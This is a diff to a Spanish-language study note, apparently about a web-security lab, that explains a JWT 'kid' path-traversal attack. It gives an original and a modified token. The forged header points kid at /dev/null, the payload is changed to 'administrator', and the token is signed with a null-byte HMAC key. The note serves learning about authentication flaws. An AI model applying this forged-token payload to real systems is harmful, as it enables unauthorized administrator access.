@@ -15,6 +15,20 @@ tags:
 ## Qué muestra
 El server usa `kid` como **ruta de archivo** para cargar la clave. Con **path traversal** apuntás a un archivo de contenido **predecible** (`/dev/null`, vacío) y firmás con esa clave "conocida".
 
+## JWT (original → modificado)
+
+**Original** (decodificado)
+```json
+{ "kid": "<uuid del server>", "alg": "HS256" }       // header
+{ "sub": "wiener" }                                  // payload
+```
+**Modificado**
+```json
+{ "kid": "../../../../../../../dev/null", "alg": "HS256" }   // header   ← cambiado
+{ "sub": "administrator" }                                  // payload  ← cambiado
+```
+> **Firma:** HMAC con Symmetric Key `k=AA==` (Base64 de un null byte = contenido de `/dev/null`).
+
 ## Diagrama
 
 ```mermaid
